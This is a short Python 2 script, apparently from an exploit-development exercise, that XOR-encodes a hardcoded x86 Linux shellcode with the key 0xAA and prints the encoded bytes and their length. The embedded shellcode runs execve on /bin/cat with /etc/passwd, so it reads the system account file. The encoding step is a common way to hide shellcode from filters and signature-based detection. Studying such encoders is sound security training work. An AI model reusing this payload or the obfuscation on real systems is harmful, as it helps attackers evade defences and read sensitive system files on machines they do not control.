#!/usr/bin/python

# Python XOR Encoder 

shellcode = ("\x31\xdb\xf7\xe3\x53\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe1\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x8d\x1c\x24\x50\x51\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	# XOR Encoding 	
	y = x^0xAA
	encoded += '\\x'
	encoded += '%02x' % y

	encoded2 += '0x'
	encoded2 += '%02x,' %y


print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
